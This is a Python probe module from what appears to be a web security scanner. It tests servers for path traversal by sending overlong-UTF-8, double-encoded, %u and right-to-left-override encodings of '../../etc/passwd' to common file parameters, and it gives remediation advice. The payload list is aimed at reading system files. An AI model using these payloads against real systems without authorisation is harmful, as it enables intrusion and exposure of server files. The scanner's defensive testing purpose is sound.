#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path traversal via overlong-UTF-8 / Unicode-decoded ``..`` escapes.

Web servers and frameworks that defend against ``..`` traversal by
matching the literal ASCII slash sometimes fail to detect overlong-
UTF-8 encodings of the same character — the well-known IIS bug
(``%c0%af`` decodes to ``/``). The same class of bypass also
involves zero-width-joiner / right-to-left-override characters
that some normalisers strip after the security check.

The detection signal is structurally unambiguous: ``/etc/passwd``
on Linux contains ``root:x:0:0`` as its first line. The string
does not appear in arbitrary HTML or JSON, so its presence in a
response body is unforgeable proof the file was read.

We require TWO encoding variants to succeed before flagging — a
single hit could in principle be a misconfigured static-error
page; two distinct bypass paths producing the same signal is
unambiguous.

Detection signal:
  Two distinct encoding variants of ``../../etc/passwd`` produce a
  response body containing ``root:`` (with the typical
  ``root:x:0:0`` shape).
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import quote, urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Endpoints that commonly accept a filename / path query
# parameter. Each entry is (path, param-name).
TARGETS = (
    ("/",                  "file"),
    ("/",                  "page"),
    ("/download",          "file"),
    ("/download",          "filename"),
    ("/api/files",         "path"),
    ("/api/file",          "path"),
    ("/preview",           "file"),
    ("/view",              "file"),
    ("/static",            "file"),
)

# Encoding variants that target the path separator. Each entry is
# (label, encoded payload). The decoded form is always
# ``../../etc/passwd``; only the byte-level encoding differs.
ENCODING_VARIANTS = (
    # Overlong UTF-8: ``/`` encoded as ``%c0%af`` (two bytes for a
    # codepoint that fits in one — RFC 3629 forbids this but many
    # parsers accept it).
    ("overlong_utf8",
        "..%c0%af..%c0%afetc/passwd"),
    # Double URL-encoded slash. Some frameworks decode twice.
    ("double_url_encoded",
        "..%252f..%252fetc/passwd"),
    # UTF-16 overlong via %u. Some legacy IIS still accepts this.
    ("utf16_pct_u",
        "..%u002f..%u002fetc/passwd"),
    # Mixed-encoding combining forward and back slash.
    ("mixed_backslash_overlong",
        "..%c0%af..%c1%9cetc/passwd"),
    # Right-to-left override embedded — some normalisers strip
    # after the security check. U+202E.
    ("rlo_with_pct_2f",
        "..%2f..%2f‮etc/passwd"),
)

# Anchored regex: ``root:x:0:0`` is the literal first-line shape
# of /etc/passwd. We require both ``root:`` AND a ``:0:0`` cluster
# to avoid false-firing on the bare word ``root`` in marketing
# copy.
PASSWD_RE = re.compile(r"\broot:[^:]*:0:0:")


class UnicodeOverlongUtf8TraversalProbe(Probe):
    name = "unicode_overlong_utf8_traversal"
    summary = ("Detects path traversal that bypasses ASCII-only `..` "
               "filters via overlong-UTF-8 and Unicode encoding "
               "variants of the path separator.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--target", action="append", default=[],
            help="Additional 'path|param' to test (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        targets = list(TARGETS)
        for t in args.target or []:
            if "|" in t:
                p, n = t.split("|", 1)
                targets.append((p.strip(), n.strip()))

        attempts: list[dict] = []
        # We need two distinct variant successes before we flag.
        successes: list[dict] = []
        for path, pname in targets:
            for label, payload in ENCODING_VARIANTS:
                # Some payloads need partial encoding (RLO is a raw
                # codepoint). We URL-encode only the runtime
                # additions — the percent-escapes inside payload
                # are intentional and must reach the server intact.
                # `quote(safe="%")` keeps `%xx` sequences as-is.
                url = (urljoin(origin, path) + "?" + pname + "=" +
                        quote(payload, safe="%"))
                r = client.request("GET", url)
                row: dict = {"path": path, "param": pname,
                              "label": label,
                              "status": r.status, "size": r.size}
                if r.body and PASSWD_RE.search(r.text or ""):
                    m = PASSWD_RE.search(r.text)
                    s, e = max(0, m.start()), min(len(r.text),
                                                   m.end() + 80)
                    row.update({"hit": True,
                                 "snippet": r.text[s:e]})
                    successes.append(row)
                attempts.append(row)
                # Two variant successes from any combination of
                # (path, param, encoding) is the threshold.
                if len(successes) >= 2:
                    break
            if len(successes) >= 2:
                break

        evidence = {"origin": origin, "attempts": attempts,
                    "successes": successes}
        if len(successes) >= 2:
            top = successes[0]
            return Verdict(
                validated=True, confidence=0.95,
                summary=(
                    f"Confirmed: overlong-UTF-8 / Unicode path "
                    f"traversal at {origin}{top['path']}?{top['param']}. "
                    f"Two encoding variants ({successes[0]['label']}, "
                    f"{successes[1]['label']}) returned /etc/passwd "
                    "content — the path filter rejects literal `../` "
                    "but accepts these encoded equivalents."),
                evidence=evidence,
                severity_uplift="critical",
                remediation=(
                    "Resolve the path BEFORE applying the security "
                    "check, not after the framework's URL decoder "
                    "but the security check's path normaliser:\n"
                    "  - Java: `Paths.get(rootDir).resolve(input).normalize()`, "
                    "then assert `result.startsWith(rootDir)`.\n"
                    "  - Python: `os.path.realpath(os.path.join(root, input))`, "
                    "then assert it begins with the base directory.\n"
                    "  - Node: `path.resolve()` + prefix check.\n"
                    "Defence in depth: reject any decoded path that "
                    "contains `..`, U+202E, or non-ASCII code points "
                    "after Unicode NFKC normalisation. On nginx / "
                    "Apache, configure to refuse percent-encoded slashes "
                    "in URL paths."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} encoding "
                     f"variants on {origin}; got "
                     f"{len(successes)} success(es) — fewer than the "
                     "2 required to flag."),
            evidence=evidence,
        )


if __name__ == "__main__":
    UnicodeOverlongUtf8TraversalProbe().main()
